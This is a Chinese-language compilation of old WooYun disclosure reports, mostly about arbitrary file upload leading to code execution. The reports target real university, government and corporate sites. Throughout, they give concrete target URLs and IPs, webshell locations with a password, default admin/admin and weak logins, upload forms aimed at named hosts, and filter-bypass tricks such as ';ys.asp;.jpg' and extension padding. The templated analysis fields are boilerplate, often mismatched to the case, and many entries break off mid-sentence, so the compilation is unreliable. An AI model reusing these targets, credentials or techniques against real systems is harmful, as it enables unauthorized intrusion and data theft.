**详情**: 第一处:http://xuewei.bjmu.edu.cn/idl/idl/ftb.imagegallery.aspxhttp://121.33.246.167/idl30/idl/ftb.imagegallery.aspxhttp://202.115.72.1/idl/idl/ftb.imagegallery.aspxhttp://lib.qfnu.edu.cn:808/idl/ftb.imagegallery.aspxhttp://xwlw.zju.edu.cn/idl/idl/ftb.imagegallery.aspxhttp://papers.libmill.com/idl/ftb.imagegallery.aspx文件名字直接用：;ys.asp;.jpg1.测试http://papers.libmill.com/idl/ftb.imagegallery.aspxhttp://20

**POC**: 1.测试案例http://xuewei.bjmu.edu.cn/idl/Check/ftb.imagegallery.aspxhttp://xuewei.bjmu.edu.cn/idl/UpLoadimages/mathimages/;ys.asp;.jpg_math.jpg1.测试http://papers.libmill.com/idl/ftb.imagegallery.aspxhttp://202.194.153.155/idl/UpLoadimages/mathimages/;ys.asp;.jpg_math.jpg

**绕过**: 直接利用

**修复**: 对文件扩展名做白名单处理
---

---
### [wooyun-2015-0159693] 新邦物流某管理系统补丁不及时导致任意文件上传
**厂商**: 广东新邦物流服务有限公司 | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cis.xbwl.cn/login!init.action可以得到webpathhttp://cis.xbwl.cn/www.jsp可上传文件

**POC**: http://cis.xbwl.cn/wooyun.jsp

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2014-050428] 大华为任意上传文件可控制服务器
**厂商**: 华为技术有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ad.huaweidevice.com/upload.php什么都没过滤 壮哉我大华为！后台密码真是。。你们改一下吧

**POC**: Shell地址http://ad.huaweidevice.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/2014020722125922.Php

**绕过**: 直接利用

**修复**: 删shell 改密码 改代码
---

---
### [wooyun-2015-0109343] 江西省安监局某系统漏洞打包
**厂商**: 江西省安监局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全生产行政执法监察系统地址：http://220.175.15.105:8080/jiangxiETL/帐号：admin，密码：admin在系统个人资料处，上传照片后，右键照片可以得到一个下载链接http://220.175.15.105:8080/jiangxiETL/accessory.do?method=showImage&path=E:\jboss-4.2.2.GA\server\default\.\deploy\jiangxiETL.war\userImage\admin.jpg构造一下http://220.175.15.105:8080/jiangxiETL/accessory.do?method=showImage&path=E:\jboss-4.2.2.GA\server\default\.\deploy\jiangxiETL.war\WEB-INF\web.xml

**POC**: 在系统内的投诉举报处存在上传点,可直接上传jsp文件文件上传后的所在的目录为：/accessoryhttp://220.175.15.105:8080/jiangxiETL/accessory/*.jsp一句话地址：http://220.175.15.105:8080/jiangxiETL/accessory/20150420233650288_01.jsp密码：sq0zr

**绕过**: 直接利用

**修复**: 修改弱口令，上传点过滤
---

---
### [wooyun-2013-024833] 加多宝饮料后台系统对外暴露可管理可上传
**厂商**: 加多宝 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 后台地址：http://58.252.61.103/servlet/qdbAction?cmd=start&stylesheet=login.xsl帐号admin 密码：admin

**绕过**: 直接利用

**修复**: 修改弱口令，分级权限，文件上传功能自己检查先。。。。
---

---
### [wooyun-2012-012497] 爱普生邮件技术支持工单系统显示逻辑、文件上传问题
**厂商**: 爱普生中国 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 爱普生中国在通过电子邮件回复客户工单的时候会附上链接：http://www.epson.com.cn/tech_support/email/user/ufeedback.asp?idcode=【工单编号】1、测试发现如果idcode为空时也会出现客户的工单。根据出现的工单中的电子邮件的统一前、后缀@ecc-sc.com.cn，我个人判断应该都是爱普生公司的内部派单，也许是在数据库中没有录入相应的工单号导致了这个问题。泄漏的工单中附件均可下载，内有发票照片等文件。2、用户提交附件的命名逻辑亦太过简单，采用了日期加四位随机数的方法，如：20120101XXXX，容易被暴力猜解。3、系统还允许用户上传GIF图片，经测试成功asp文件伪造成gif上传成功。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、对idcode是否为空作判断。2、可在现有重命名逻辑的基础上使用md5确保附件路径无法被猜解3、禁止gif类型或验证判断是否为合法gif文件
---

---
### [wooyun-2015-0128411] 武汉房地产网站存在上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,http://wufun.nethttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/head/1437554797291.jsp打开进马儿来几张截图个个硬盘都有权限，权限很大啊，危害也打！求大大通过,TM权6都不通过的，我就醉了

**POC**: www.wufun.net来个截图我通常看到了注册的都会去试试注册的看看有没有存在上传漏洞注册成功，第一看到的就是头像上传点如段上传,jpg图片马妈咪告诉我,显然存在漏洞于是上传jsp马这个网站jsp类型的上传了jsp马儿,http://wufun.nethttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/head/1437554797291.jsp打开进马儿来几张截图个个硬盘都有权限，权限很大啊，危害也打！求大大通过,TM权6都不通过的，我就醉了

**绕过**: 直接利用

**修复**: 过滤,限制
---

---
### [wooyun-2016-0181611] 绕过360主机卫士文件上传防护
**厂商**: 奇虎360 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在测试一个站的时候 发现ewebeditor编辑器一枚这里修改类型为aaspsp因为EW编辑器会默认过滤一遍然后我们来上传下试试看可以看到 拦截了这里拦截的 并不是文件内容 而是文件扩展名 asp aspx 之类的 都会被拦截我们来改下再试试看对比一下 这里我只是多加了一个1 就轻松绕过

**POC**: 在测试一个站的时候 发现ewebeditor编辑器一枚这里修改类型为aaspsp因为EW编辑器会默认过滤一遍然后我们来上传下试试看可以看到 拦截了这里拦截的 并不是文件内容 而是文件扩展名 asp aspx 之类的 都会被拦截我们来改下再试试看对比一下 这里我只是多加了一个1 就轻松绕过

**绕过**: 过滤绕过

**修复**: 我是菜逼 我不懂 你们懂
---

---
### [wooyun-2015-0162859] 地震台网某服务器JBOSS中间件Java 反序列化
**厂商**: 中国地震台网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**:8080/进去是www权限这是后台用户名和口令一些仪器型号和供应商可以看到这个监测点的经纬度、台网代码等信息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 可以参考下https://**.**.**.**/ikkisoft/SerialKiller
---

---
### [wooyun-2014-052754] 河北通信工程质量监督中心任意文件上传
**厂商**: 河北通信工程质量监督中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ..............

**POC**: 第一步  http://www.txzjz.gov.cn/hebca/ 咱先来到这儿   （看上去没什么奇特的地方  一个登陆页面）第二步  注册 我们点击后来到这个地方 http://www.txzjz.gov.cn/hebca/qygl/qyzc.aspx第三步 企业注册 这里比较轻松  例如啊 注册申请码 63227 先记下来第四步 返回 第一步的页面 用注册申请码的 63227 和 密码 222222 登陆第五步 按提示操作 填写单位名称（貌似是在教学怎么注册企业用户  = =! ）附：意外之喜  在企业名称中带着英文上单引号会出现sql报错第六步 保存后点击浏览 选择一个aspx的小

**绕过**: 直接利用

**修复**: .................
---

---
### [wooyun-2014-061949] 某市安全生产监督管理局上传漏洞
**厂商**: 六安市安全生产监督管理局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.laanhuisafety.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接上传jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制上传jsp
---

---
### [wooyun-2014-087309] 南开大学某网站任意上传下载漏洞导致南开大学大量数据泄露
**厂商**: nankai.edu.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先存在查看目录漏洞然后看到了喜闻乐见的upload，点击上传上传没有过滤。。。。。上传后文件为菜刀连接

**POC**: 继续写，上传完以后发现http://fuxue.nankai.edu.cn/commonhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/files/assessment/可以直接浏览。。。。无语了数据库貌似设计05年到14年南开大学学生，还包括部分辅导员。。。。

**绕过**: 直接利用

**修复**: 不懂。。。。
---

---
### [wooyun-2014-082438] 兴隆大家庭VIP代码执行
**厂商**: 兴隆大家庭 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先来看看首页吧：

**POC**: S2引起的：执行命令看看吧：http://xlvip.xinglongstore.com/xlvip/login.action

**绕过**: 直接利用

**修复**: 改吧.....估计会忽略....
---

---
### [wooyun-2014-072719] 湖北大学国有资产与实验管理处后台存在弱口令及文件上传漏洞
**厂商**: CCERT教育网应急响应组 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台存在弱口令，且可以上传asp等格式文件，对文件上传未过滤

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、修改后台管理帐号密码;2、对文件上传进行严格过滤；3、定期对网站目录下检查;4、新增登录日志记录或审计功能，定期查看日志或审计记录。
---

---
### [wooyun-2012-08846] 魅族论坛存在nginx解析漏洞
**厂商**: 魅族科技 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: bbs.meizu.com 前端是nginx反向代理 后端是IISnginx处存在解析漏洞，任意文件可以以php执行但是由于文件上传是分开的，所以利用条件比较苛刻，但是不排除后续可以利用。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级nginx或修改nginx配置
---

---
### [wooyun-2015-0152259] 西安交通大学本科教务系统任意文件查看及写入
**厂商**: 西安交通大学 | **年份**: 2015 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/epstar/login/mixLogin.jsp任意文件上传：http://**.**.**.**/epstar/servlet/RaqFileServer?action=save&fileName=/../test.jsp访问：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 补丁，外网访问做身份认证
---

---
### [wooyun-2013-041616] 南阳市移民局 任意文件上传漏洞
**厂商**: 南阳市移民局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件上传漏洞，导致控制服务器！

**POC**: 任意文件上传漏洞，导致控制服务器！

**绕过**: 直接利用

**修复**: 厂商修复
---

---
### [wooyun-2014-081419] 某通用建站系统漏洞打包（任意文件上传）
**厂商**: 长威信息科技发展股份有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在该漏洞的厂商为：长威信息科技发展股份有限公司http://www.evecom.net/长威信息科技发展股份有限公司，是一家全国领先的IT综合服务提供商。长威科技致力于以智慧城市为核心领域的软件研发、解决方案集成及运行维护服务，并已构建起完整的IT服务价值链，为客户提供端到端的IT信息化服务。曾经的那些bug（感谢possible的分析，找了一下午才发现你已经提过了部分..）：WooYun: 福建省国土资源厅任意jsp上传其中修复方案中有指出其拦截代码为evecom.jspcode='|and|set|exec|varchar|insert|select|*|update|delete|chr|master|truncate|char|declare|<|>注意evecom即长威（该站已换厂商了）WooYun: 福建某些局站点任意文件下载案例中的../WEB-INF/web.xml也指

**POC**: 以厂商主站为例1、上传页面未授权访问，导致文件任意上传、文件任意删除；可以用possible提供的exp，也可以自己抓个包，将realPath=null改为realPath=/，或其它（这里没有设置limit和hold参数，所有文件被重命名为  原文件名+时间戳.jsp）http://www.evecom.net/test20141030085829.jsp通过以下链接可完成文件删除动作，注意realPath的修改http://www.evecom.net/delMoreFile.do?realPath=/&filename=test20141030085829.jsp&notSelect=1

**绕过**: 直接利用

**修复**: 修复对任意文件下载应该是过滤../ 并且文件后缀白名单检查吧上传路径不可控+重命名+白名单未授权访问加上登录session验证
---

---
### [wooyun-2015-0112815] 某通用型校园学生综合管理系统上传漏洞
**厂商**: 金仕达 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版权所有?SUNGARD 金仕达 数字化校园基础平台案例：http://xuegong.stiei.edu.cn:9093/ZS/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asphttp://xuegong.stiei.edu.cn:9091/framework/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector

**POC**: 案例证明：http://xuegong.stiei.edu.cn:9093/ZS/fckeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp可shell，证明如下：

**绕过**: 直接利用

**修复**: 000
---

---
### [wooyun-2015-0109742] 广西大学存在fck漏洞
**厂商**: 广西大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个网站http://jwgl.gxu.edu.cn/存在fck2.6.6上传漏洞http://jwgl.gxu.edu.cn/fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2013-033576] 云天时空科技某系统存在struts漏洞系统和mysql均为root权限
**厂商**: 北京云天时空科技有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 见证明

**POC**: 地址：http://218.202.7.116/login.domysql账户有最高权限，可控制多个数据库管理员密码解密为admin弱口令

**绕过**: 直接利用

**修复**: 升级补丁
---

---
### [wooyun-2014-047251] 西安飞扬航运商旅有限公司任意代码执行
**厂商**: 西安飞扬航运商旅有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 西安飞扬航运商旅有限公司 http://www.fyair.comJBOSS

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153935] 淮海工学院的一次渗透(邮箱/OA/网站后台)
**厂商**: 淮海工学院 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从通达OA开始**.**.**.**<form enctype="multipart/form-data" action="http://**.**.**.**/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>http://**.**.**.**/general/vmeet/wbUpload/test.php用户名                 jianfen$全名注释用户的注释国家(地区)代码         000 (系统默认值)帐户启用               Yes帐户到期               从不上次设置密码  

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1. 通达OA任意上传修复2. 邮箱敏感定时清理
---

---
### [wooyun-2014-082385] kppw任意文件上传-2
**厂商**: KPPW | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: keke_user_avatar_class.php文件：static function uploadavatar($uid) {@header ( "Expires: 0" );@header ( "Cache-Control: private, post-check=0, pre-check=0, max-age=0", FALSE );@header ( "Pragma: no-cache" );if (empty ( $uid )) {return - 1;}if (empty ( $_FILES ['Filedata'] )) {return - 3;}list ( $width, $height, $type, $attr ) = getimagesize ( $_FILES ['Filedata'] ['tmp_name'] );$imgtype = array (1 => 

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2015-099743] 某高校在用网上银行缴费系统通用漏洞打包
**厂商**: 神州浩天 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键词:intitle:网银收费系统百度google搜索即可.下面是给出部分用户列表.222.180.192.243  | 222.180.192.243 |  电信  |  重庆市|202.38.194.47  | 202.38.194.47 |  华南理工大学逸夫楼实验室  |  广东省广州市|218.199.196.90  | 218.199.196.90 |  华中师范大学  |  湖北省武汉市|www.wsjf.sdnu.edu.cn  | 210.44.2.131 |  山东师范大学  |  山东省济南市|wyjf.zjnu.edu.cn  | 210.33.81.6 |  浙江师范大学  |  浙江省杭州市|sfcx.zjnu.edu.cn  | 61.153.34.35 |  浙江师范大学  |  浙江省金华市|wsjf.scuec.edu.cn  | 210.42.144

**POC**: 1)前台直接getshell.任意文件上传漏洞我们先看看发包的过程.然后,发现此页面前台为授权即可访问到.所以,只要模拟这个发包的过程即可.<html><form action="http://wszf.nwpu.edu.cn/admin/Fileup.aspx?path=notice/" method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>注释:上

**绕过**: 直接利用

**修复**: 修复你们肯定在行
---

---
### [wooyun-2014-055253] 某政府国土资源局上传漏洞
**厂商**: 某政府国土资源局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ahstgt.gov.cn/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对访问权限进行限制
---

---
### [wooyun-2015-0149494] 国联证券某安全隐患导致可登陆多个系统（员工手机邮箱/内部文档/可找回密码/任意文件上传）
**厂商**: 国联证券 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://newoa.glsc.com.cn:8082/国联证券预算管理系统爆破出一账号登陆进去员工手机邮箱等等信息全部泄露内部文件办公文件

**POC**: 这个系统可直接访问邮箱，默认密码通知有了邮箱，部分系统可找回密码以其中一个系统为例邮件发到邮箱中登陆平台这个平台头像上传还存在任意文件上传，burp改包，可以改上传文件后缀不在深入了

**绕过**: 直接利用

**修复**: 安全意识
---

---
### [wooyun-2015-0158353] 金蝶K3财务软件系统任意文件上传demo测试成功
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址http://**.**.**.**/k3cloud/漏洞代码如下public void ProcessRequest(HttpContext context){try{context.Response.ContentType = "text/plain";string physicalPath = context.Request.Headers["filefolder"];if (string.IsNullOrEmpty(physicalPath)){physicalPath = context.Server.MapPath("UploadFiles");}else{physicalPath = PathUtils.GetPhysicalPath(physicalPath);}if (!Directory.Exists(physicalPath)){Directory.Creat

**POC**: 随便找了个网站http://**.**.**.**/k3cloud官网demo

**绕过**: 直接利用

**修复**: 对文件后缀进行判断。
---

---
### [wooyun-2013-035334] 北京联达动力OA协同办公管理平台任意文件上传漏洞
**厂商**: 联达动力 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #0 本OA协同管理系统的客户源http://www.lkpower.com/templates/T_Second/index_150.html国务院港澳办国家体育总局国土资源部土地整理中心中国财政部投资评审中心中国农业科学院北京市教委北京市教工委山西省科学技术厅陕西省核工业地质局江苏省无线电管理局昆明市环境保护局昆明市水利局上海市宝山区公路管理署山东枣庄市工商行政管理局宁波江东区人民政府昆明市滇池管理局陕西人民广播电台沈阳广播电视台路桥集团国际建设股份有限公司中交第三公路工程局有限公司中交第四公路工程局有限公司中国建筑发展有限公司济南四建（集团）有限责任公司河南省宏力集团有限公司中国水电八局溪洛渡施工局北京天润子真建筑装饰有限责任公司北京康成人工环境工程有限公司首都医科大学附属北京安定医院北京中关村医院上海杨浦区疾病预防控制中心江西省人民医院安徽省合肥市第二人民医院无锡市妇幼保健医院徐州

**POC**: #3 SHELL 地址http://222.132.***.***:8080/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg

**绕过**: 直接利用

**修复**: # 校验savepath，或强制客户使用iis7以上中间件。
---

---
### [wooyun-2016-0197712] 海信集团某组件存在上传漏洞
**厂商**: hisense.com | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: uploadfily组件http://himall.hisense.com/assets/common/uploadify/http://218.58.78.151/new_theme/common/uploadify/http://218.58.78.151/new_theme/common/uploadify/uploadify.php漏洞参考：WooYun: 迈外迪某后台使用第三方组件存在上传漏洞

**POC**: 同样漏洞出现过WooYun: 海信集团某系统弱口令后台任意文件上传http://qr.hisense.com/widget/uploadify/?1&20141107$ pwd/dbdata/virtualHosts/haixin_partner

**绕过**: 直接利用

**修复**: 更新，或附件过滤
---

---
### [wooyun-2015-0107100] 某投资促进系统通用型漏洞打包
**厂商**: 北京大思潮投资顾问有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大思潮是投资促进新思维与解决方案的专业提供机构，十多年来一直为国内各省、市、区县及开发区提供吸引外来投资的决策研究及与投资促进相关的咨询、策划、政策、信息、活动、培训、设计和网络技术等专业服务，并为中外投资者在国内投资，尤其是在京投资提供全方位系列服务。大思潮立足中国投资促进实践，创新思维，以“利他”为行为指导，以“诚实做人，认真做事”为行为规范，着力于推进投资促进事业。十五年中，大思潮用真诚的心，做专业的事，已完成了数百个投资促进领域政府、开发区和投资者的委托项目。官网：http://www.fdip.cn以官网为案例进行演示：系统存在问题的地方在编辑器编辑器路径http://www.fdip.cn/cms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAnd

**POC**: 再演示一个北京市投资促进局http://www.investbeijing.gov.cn/http://www.investbeijing.gov.cn//cms//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../http://www.investbeijing.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.htm?Type

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2015-0141660] 珍爱网任意文件上传可影响千万用户资料
**厂商**: 珍爱网 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第三方程序的漏洞.算是0day了.

**POC**: http://razor.zhenai.com/razor 0.6-0.7.1 通用上传漏洞

**绕过**: 直接利用

**修复**: 删除根目录里面的assets/swf/uploadify.php
---

---
### [wooyun-2014-047591] 某交易权属管理系统漏洞导致全国各地房产信息数据泄露
**厂商**: 必特思维交易权属管理系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 未经认证直接上传文件http://www.lzfg.com.cn/tt/page/attachfile_upload.asp?savepath=E:\bit-service\tt\默认的系统安装路径E:\bit-service\tt\ 或者C:\bit-service\tt\ 或者D:\bit-service\tt\<form id="frmUpload" enctype="multipart/form-data"action="http://110.167.173.115/TT/Page/attachfile_upload.asp?savepath=D:\bit-service\tt\" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpl

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-056257] 如家管理大学任意文件上传(系统root权限)
**厂商**: 如家酒店集团 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://el.homeinns.com/login/index.html随便找了个弱口令登录lsun 123456个人中心任意文件上传，绕过js验证就可以了。

**POC**: 系统root权限，同服务器另一域名

**绕过**: 过滤绕过

**修复**: 过滤上传类型
---

---
### [wooyun-2013-022145] 首信易支付根目录都可遍历,信息泄露以及任意文件上传
**厂商**: 首信易 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.beijing.com.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F../../../../../../貌似到顶了

**POC**: http://www.beijing.com.cn/2013-04-19-03-17-13930806752.txt

**绕过**: 直接利用

**修复**: 过滤
---

